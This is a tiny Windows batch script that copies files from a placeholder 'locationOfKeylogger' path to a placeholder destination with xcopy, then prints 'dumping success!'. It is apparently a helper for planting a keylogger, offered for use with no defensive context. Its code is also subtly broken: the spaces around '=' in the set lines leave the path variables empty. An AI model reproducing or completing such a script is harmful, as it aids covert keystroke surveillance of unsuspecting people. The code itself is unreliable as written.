@echo off

set "sourcePath = locationOfKeylogger"  
set "destinationPath = whereToCopy" 
xcopy "%sourcePath%" "%destinationPath%" /E /I /Y

echo dumping success!

pause
